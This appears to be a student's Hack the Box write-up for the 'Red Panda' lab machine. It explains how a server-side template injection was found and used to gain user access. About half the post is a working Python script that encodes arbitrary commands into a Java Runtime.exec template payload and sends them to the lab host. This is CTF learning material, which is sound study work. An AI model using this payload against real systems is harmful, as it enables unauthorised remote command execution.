---
layout: single
title: Hack the Box - Red Panda
---

## SSTI - Red Panda writeup

As an exercise for the red-teaming specialisation, our teacher encouraged us to start using Hack the Box environment to learn hacking in practice. Because I do not have 
much CTF and hands-on hacking experience, I have decided to start with an 'easy' machine - Red Panda

![Redpanda main page](../../assets/img/redpanda/redpanda.png)

The website displays a search bar and some text. I tried searching different words, but the searched returned none. However, when I searched for an empty phrase, this
was the result:

![Greg panda](../../assets/img/redpanda/greg.png)

I tried sending multiple SQLI payloads, but the service seemed immune to database injection attacks. A colleague gave me a tip to try using Server Side Template Injecton.
Because I have never heard of this technique, I had to spend some time on learning it and adjusting it to the service. Finally, I found the proper characters to enclose 
my payload with - _*{ malicious code }_. I tried getting all environment variables from the host.

![Server's environment variables](../../assets/img/redpanda/get_env.png)

I tried testing multiple payloads from *[PayloadsAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java)*,
and it turned out I can only execute commands on the host OS when encoding them into characters from integers. Therefore, I have decided to create a script which will
allow me to encode commands and send them to the vulnerable endpoint.

```python
import sys
import requests
from bs4 import BeautifulSoup as bs
# prepare payload
first = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("
last = ").getInputStream())}"
mid = ""
command = sys.argv[1]
for i, c in enumerate(command):
    if i == 0:
        mid += f"T(java.lang.Character).toString({ord(c)})"
    else:
        mid += f".concat(T(java.lang.Character).toString({ord(c)}))"
payload = first + mid + last
# send post request to /search
ip = "10.10.11.170"
endpoint = "search"
res = requests.post(f"http://{ip}:8080/{endpoint}", data={'name': payload} )
soup = bs(res.content, "html.parser")
searched = soup.find("h2", {"class": "searched"})
print(searched.get_text())
```

The script worked and I managed to gain user access to the system. I was able to read the flag in user's home directory.

![User flag](../../assets/img/redpanda/user.png)
